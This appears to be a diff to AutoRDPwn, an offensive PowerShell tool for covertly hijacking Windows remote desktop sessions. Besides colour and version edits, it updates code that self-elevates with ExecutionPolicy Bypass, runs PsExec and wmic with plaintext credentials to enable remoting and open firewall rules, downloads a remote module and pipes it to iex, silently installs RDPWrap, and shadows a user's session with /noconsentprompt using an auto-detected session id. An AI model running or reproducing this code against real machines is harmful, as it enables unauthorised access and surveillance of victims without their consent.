@@ -1,19 +1,19 @@
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 
-$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v2.4 - by @JoelGMSec"
+$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v2.6 - by @JoelGMSec"
 $Host.UI.RawUI.BackgroundColor = 'Black'
 $Host.UI.RawUI.ForegroundColor = 'Gray'
 $Host.PrivateData.ErrorForegroundColor = 'Red'
 $Host.PrivateData.WarningForegroundColor = 'Magenta'
 $Host.PrivateData.DebugForegroundColor = 'Yellow'
 $Host.PrivateData.VerboseForegroundColor = 'Green'
-$Host.PrivateData.ProgressForegroundColor = 'Cyan'
+$Host.PrivateData.ProgressForegroundColor = 'Blue'
 Clear-Host
 
 function Show-Menu {
 
      Write-Host ""
-     Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue; Write-Host "         v2.4  " -ForegroundColor Yellow
+     Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue; Write-Host "         v2.6  " -ForegroundColor Yellow
      Write-Host "   /  _  \  __ __|  |_ ____" -NoNewLine -ForegroundColor Magenta; Write-Host "\______   \______ \______  \" -NoNewLine -ForegroundColor Blue; Write-Host "_  _  _______  " -ForegroundColor Green
      Write-Host "  /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta; Write-Host "|       _/|     \ |    ___/" -NoNewLine -ForegroundColor Blue; Write-Host " \/ \/ /     \ " -ForegroundColor Green
      Write-Host " /  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta; Write-Host "|   |    \|_____/ |   |" -NoNewLine -ForegroundColor Blue; Write-Host " \        /   |   \" -ForegroundColor Green
@@ -53,7 +53,7 @@ function ConvertFrom-SecureToPlain {
             $user = Read-Host -Prompt 'Y el usuario?'
             Write-Host ""
             $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
-            $Host.UI.RawUI.ForegroundColor = 'Cyan'
+            $Host.UI.RawUI.ForegroundColor = 'Blue'
             Invoke-WebRequest -Uri "https://live.sysinternals.com/psexec.exe" -OutFile "psexec.exe" -UseBasicParsing
             $PlainTextPassword = ConvertFrom-SecureToPlain $password
             .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "winrm quickconfig -quiet; Enable-PSRemoting -Force; Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private" -accepteula
@@ -67,7 +67,7 @@ function ConvertFrom-SecureToPlain {
             $user = Read-Host -Prompt 'Y el usuario?'
             Write-Host ""
             $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
-            $Host.UI.RawUI.ForegroundColor = 'Cyan'
+            $Host.UI.RawUI.ForegroundColor = 'Blue'
             Invoke-WebRequest -Uri "https://live.sysinternals.com/PsExec64.exe" -OutFile "PsExec64.exe" -UseBasicParsing
             $PlainTextPassword = ConvertFrom-SecureToPlain $password
             .\PsExec64.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "winrm quickconfig -quiet; Enable-PSRemoting -Force; Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private" -accepteula
@@ -87,7 +87,7 @@ function ConvertFrom-SecureToPlain {
         Write-Host ""
         $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
         Write-Host ""
-        $Host.UI.RawUI.ForegroundColor = 'Cyan'
+        $Host.UI.RawUI.ForegroundColor = 'Blue'
         $PlainTextPassword = ConvertFrom-SecureToPlain $password
         wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe winrm quickconfig -quiet; Enable-PSRemoting -Force; Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private"
         wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes"
@@ -102,7 +102,7 @@ function ConvertFrom-SecureToPlain {
         Write-Host ""
         $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
         Write-Host ""
-        $Host.UI.RawUI.ForegroundColor = 'Cyan'
+        $Host.UI.RawUI.ForegroundColor = 'Blue'
 	$credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 	(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs.psm1") | iex
         Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "winrm quickconfig -quiet; Enable-PSRemoting -Force; Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private" }
@@ -203,13 +203,16 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
     invoke-command -session $RDP[0] -scriptblock {
     Invoke-WebRequest -Uri "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWInst-v1.6.2.msi" -OutFile "RDPWInst-v1.6.2.msi" -UseBasicParsing
     msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart 
-    Write-Host ""
     netsh advfirewall firewall delete rule name="Agente de sesión de RDP"
     netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes
     netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes
     sleep -milliseconds 7500; rm .\RDPWInst-v1.6.2.msi 2> $null }
-    if($control -eq 'true') { mstsc /v $computer /admin /shadow:1 /control /noconsentprompt /prompt /f }
-    else { mstsc /v $computer /admin /shadow:1 /noconsentprompt /prompt /f }}
+    
+    $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
+    Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow; sleep -milliseconds 2500
+    Write-Host ""
+    if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
+    else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
 rm .\psexec.exe, .\PsExec64.exe 2> $null
-Write-Host "Iniciando conexión remota.." -ForegroundColor Yellow; sleep -milliseconds 2500
+Write-Host "Iniciando conexión remota.." -ForegroundColor Blue; sleep -milliseconds 2500
